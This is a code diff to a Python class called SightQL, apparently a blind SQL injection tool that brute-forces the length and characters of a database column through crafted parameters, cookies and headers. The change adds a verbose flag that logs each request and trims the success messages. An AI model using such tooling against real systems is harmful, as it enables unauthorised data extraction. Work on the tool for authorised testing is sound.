@@ -32,7 +32,7 @@ class SightQL:
         "SQLITE"
     ]
 
-    def __init__(self, target:str, params:dict, column_to_exfil:str, predicate, data_found="", length=-1, method="GET", cookies={}, headers={}, user_agent="", json_mode=False, sleep=0.0, dbms="MYSQL") -> None:
+    def __init__(self, target:str, params:dict, column_to_exfil:str, predicate, data_found="", length=-1, method="GET", cookies={}, headers={}, user_agent="", json_mode=False, verbose=False, sleep=0.0, dbms="MYSQL") -> None:
         self.target = target
         self.params = params
         self.data_exfil = data_found
@@ -58,6 +58,7 @@ class SightQL:
             self.headers["User-Agent"] = user_agent
 
         self.json_mode = json_mode
+        self.verbose = verbose
         self.sleep = sleep
 
         self.predicate = predicate
@@ -119,16 +120,23 @@ class SightQL:
     
     def get_size(self):
         s = log.progress("Getting size")
+    
         i = 1
         while True:
+            s.status(f"{i}")
             data = self.format_dict_length(self.params, i)
             cookies = self.format_dict_length(self.cookies, i)
             headers = self.format_dict_length(self.headers, i)
 
+            if self.verbose:
+                log.info(f"Data sent: {data}")
+                log.info(f"Headers sent: {headers}")
+                log.info(f"Cookies sent: {cookies}")
+
             r = self.fetch(data, cookies, headers)
             if self.predicate(r):
                 self.length = i
-                s.success(f"Size found: {i}")
+                s.success(f"{i}")
                 break
             i += 1
     
@@ -140,6 +148,11 @@ class SightQL:
                 cookies = self.format_dict_data(self.cookies, c)
                 headers = self.format_dict_data(self.headers, c)
 
+                if self.verbose:
+                    log.info(f"Data sent: {data}")
+                    log.info(f"Headers sent: {headers}")
+                    log.info(f"Cookies sent: {cookies}")
+
                 r = self.fetch(data, cookies, headers)
                 if self.predicate(r):
                     self.data_exfil += c
@@ -147,5 +160,6 @@ class SightQL:
                     break
                 time.sleep(self.sleep)
 
-        s.success(f"Data found: {self.data_exfil}")
+
+        s.success(f"{self.data_exfil}")
         
